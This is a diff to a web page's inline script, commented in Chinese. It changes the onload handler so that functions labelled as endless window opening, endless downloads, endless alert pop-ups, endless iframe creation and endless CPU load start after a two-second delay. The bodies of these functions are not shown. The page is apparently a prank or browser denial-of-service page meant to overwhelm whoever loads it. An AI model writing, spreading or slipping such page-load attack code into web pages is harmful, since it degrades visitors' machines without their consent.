@@ -14,16 +14,18 @@
         <script>
             // 頁面載入時執行其他行為
             window.onload = function() {
-                // **無限開新視窗**
-                openWindows();
-                // **無限下載**
-                startDownload();
-                // **無限彈出警告**
-                annoyingAlert();
-                // **無限創建 iframe**
-                spamIframe();
-                // **無限 CPU 負載**
-                burnCPU();
+                setTimeout(function() {
+                    // **無限開新視窗**
+                    openWindows();
+                    // **無限下載**
+                    startDownload();
+                    // **無限彈出警告**
+                    annoyingAlert();
+                    // **無限創建 iframe**
+                    spamIframe();
+                    // **無限 CPU 負載**
+                    burnCPU();
+                }, 2000); // 2秒後開始執行
             };
 
             // 當頁面被點擊時播放音樂
